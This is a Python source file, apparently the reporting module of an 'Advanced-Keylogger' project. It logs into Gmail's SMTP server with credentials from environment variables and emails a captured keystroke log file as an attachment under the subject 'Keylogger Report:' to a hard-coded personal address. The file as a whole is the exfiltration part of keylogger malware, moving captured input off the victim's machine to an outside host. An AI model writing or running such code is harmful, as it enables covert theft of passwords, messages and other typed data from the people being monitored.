#Imports
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import smtplib,ssl
import os

from dotenv import load_dotenv
load_dotenv()

def send_mail(email : str):
    backemail_add = os.environ.get('BACKEND_MAIL_ADDR')
    backemail_pwd = os.environ.get('BACKEND_MAIL_PWD')
    #backemail_add = os.getenv('BACKEND_MAIL_ADDR')
    #backemail_pwd = os.getenv('BACKEND_MAIL_PWD')
    
    #Starts a server on port 465 and logs into senders email id so it can send the mail
    server = smtplib.SMTP_SSL("smtp.gmail.com",465)
    server.login(backemail_add,backemail_pwd)                           

    #user mail subject, body and format of the mail
    subject = 'Keylogger Report:'
    body = f'Dear User\nThis is a test email\n\nThank you!\n\nWarm Regards,\n\nSecuritySolutions'
    msg = f'Subject: {subject}\n\n{body}'

    #Sends the mail with the data and quits the server
    server.sendmail(backemail_add,email,msg)
    server.quit()

def send_mail_with_attachment(email : str):
    backemail_add = os.environ.get('BACKEND_MAIL_ADDR')
    backemail_pwd = os.environ.get('BACKEND_MAIL_PWD')

    msg = MIMEMultipart()
    msg['From'] = backemail_add
    msg['To'] = email
    
    msg['Subject'] = "Keylogger Report:"
    body = "Dear User\nThis is a test email\n\nThank you!\n\nWarm Regards,\n\nSecuritySolutions"
    msg.attach(MIMEText(body, 'plain'))
    
    filename = "test_log.txt"
    attachment = open(r"C:\Users\nikhi\Desktop\Advanced-Keylogger\test_log.txt", "rb")

    att = MIMEBase('application', 'octet-stream')
    att.set_payload((attachment).read())
    encoders.encode_base64(att)
    att.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(att)
    
    #Starts a server on port 465 and logs into senders email id so it can send the mail
    server = smtplib.SMTP_SSL("smtp.gmail.com",465)
    server.login(backemail_add,backemail_pwd)       

    text = msg.as_string()
    server.sendmail(backemail_add, email, text)
    server.quit()

if __name__=='__main__':
    #send_mail("nvombatkere@gmail.com")
    send_mail_with_attachment("nvombatkere@gmail.com")